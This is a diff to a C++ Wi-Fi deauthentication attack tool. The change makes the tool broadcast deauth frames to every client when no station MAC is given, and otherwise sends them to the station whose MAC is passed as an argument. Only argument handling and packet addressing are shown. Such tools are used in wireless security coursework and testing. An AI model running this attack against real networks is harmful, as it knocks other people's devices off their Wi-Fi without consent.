@@ -56,10 +56,7 @@ int main(int argc, char *argv[]) {
 	string ap_mac;
 	string station_mac;
 
-	if (argc == 3) 
-		station_mac = "ff:ff:ff:ff:ff:ff"; // <ap mac> -- broadcast
-	else if(argc == 4 || (argc == 5 && !strncmp(argv[4],"-auth",5))) 
-		station_mac = argv[3]; // <ap mac> -- unicast
+	if (argc == 3 || argc == 4 || (argc == 5 && !strncmp(argv[4],"-auth",5)));
 	else usage();
 
 
@@ -87,7 +84,8 @@ int main(int argc, char *argv[]) {
 	}else{
 		struct deauth_attack_packet deauth_packet;
 		cout << "[*] Deauth_attack triggerd" << endl;
-		set_mac(deauth_packet.destination,argv[3]);
+		if (argc==3) memset(deauth_packet.destination,255,6);
+		else set_mac(deauth_packet.destination,argv[3]);
 		set_mac(deauth_packet.source,argv[2]);
 		set_mac(deauth_packet.bssid,argv[2]);
 
